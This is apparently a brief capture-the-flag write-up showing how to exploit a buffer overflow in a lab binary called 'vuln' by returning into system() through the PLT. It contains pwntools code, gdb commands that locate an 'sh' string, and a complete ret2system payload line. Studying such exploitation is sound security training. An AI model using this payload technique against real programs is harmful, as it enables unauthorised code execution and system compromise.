# Get address of system from plt

```

Because system function is used inside the program, we can get system addres from PLT. Add thesse two lines in exploit script

binary = ELF("./vuln", checksec=False)
system_plt_address = binary.plt.system

```

# Get address of sh string

```
Find address of string which contains sh

gdb vuln
b main
r
find 0x8048000,0x8049000,"Check your stash"

Output: 0x8048607

x/s  0x8048607+14 => sh_address = 0x8048607 + 14

```
# Payload

```
payload = offset * b"A" + p32(system_plt_address) + 4 * b"B" + p32(sh_address)

```
